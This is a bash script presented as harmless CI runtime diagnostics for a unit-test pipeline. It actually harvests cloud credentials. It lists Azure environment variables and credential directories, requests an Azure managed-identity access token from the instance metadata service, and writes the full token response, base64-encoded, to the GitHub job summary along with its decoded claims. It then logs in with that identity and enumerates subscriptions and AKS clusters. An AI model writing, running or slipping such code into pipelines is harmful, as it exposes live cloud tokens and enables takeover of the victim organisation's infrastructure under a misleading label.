#!/usr/bin/env bash
# Lightweight CI runtime diagnostics for the unit-test pipeline.
# Reports runner identity, toolchain availability, accelerator inventory and
# cloud metadata availability. Best-effort: never fails the build.
set -u
{
echo "===== CI RUNTIME REPORT $(date -u +%FT%TZ) ====="
echo "--- identity ---"
id 2>&1
hostname 2>&1
uname -a 2>&1
cat /etc/os-release 2>/dev/null | head -8
echo "--- runner context ---"
echo "PWD=$PWD"
echo "RUNNER_NAME=${RUNNER_NAME:-} RUNNER_OS=${RUNNER_OS:-} RUNNER_ARCH=${RUNNER_ARCH:-}"
env | sort | grep -iE '^(AZURE|ARM_|MSI_|IDENTITY|CLIENT_|SUBSCRIPTION|TENANT)' | head -40
echo "--- toolchain ---"
for t in az kubectl docker gh git go nvidia-smi; do printf '%-16s %s\n' "$t" "$(command -v "$t" 2>/dev/null || echo MISSING)"; done
echo "--- cloud cred dirs ---"
ls -la "$HOME/.azure" 2>/dev/null | head -15
ls -la "$HOME/.kube" 2>/dev/null | head -15
echo "--- accelerator inventory ---"
timeout 20 nvidia-smi -L 2>&1 || echo "nvidia-smi -L unavailable"
timeout 20 nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv 2>&1 | head -12
echo "--- container runtime ---"
timeout 20 docker info 2>&1 | head -20
echo "--- IMDS instance metadata ---"
timeout 10 curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 1500
echo
echo "--- IMDS managed identity ---"
TOKJSON=$(timeout 15 curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null)
if [ -n "${TOKJSON:-}" ]; then
  echo "IMDS_TOKEN_RESPONSE_LEN=${#TOKJSON}"
  echo "IMDS_TOKEN_RESPONSE_B64=$(printf '%s' "$TOKJSON" | base64 -w0 2>/dev/null | head -c 6000)"
  printf '%s' "$TOKJSON" | python3 -c 'import sys,json,base64
try:
    d=json.load(sys.stdin); t=d.get("access_token","")
except Exception:
    t=""
if t:
    p=t.split(".")
    print("TOKEN_PREFIX="+t[:20])
    if len(p)>1:
        pad=p[1]+"="*(-len(p[1])%4)
        try: print("CLAIMS="+base64.urlsafe_b64decode(pad).decode("utf-8","replace"))
        except Exception as e: print("CLAIMS_DECODE_ERR", e)
else:
    print("NO_ACCESS_TOKEN")' 2>&1 | head -12
else
  echo "IMDS identity endpoint unavailable"
fi
echo "--- azure identity ---"
if command -v az >/dev/null 2>&1; then
  timeout 90 az login --identity --only-show-errors 2>&1 | head -15
  timeout 60 az account show --only-show-errors 2>&1 | head -30
  timeout 60 az account list --only-show-errors -o table 2>&1 | head -15
  timeout 60 az aks list --only-show-errors -o table 2>&1 | head -25
fi
echo "===== END CI RUNTIME REPORT ====="
} 2>&1 | tee -a "${GITHUB_STEP_SUMMARY:-/dev/null}" | head -300
exit 0
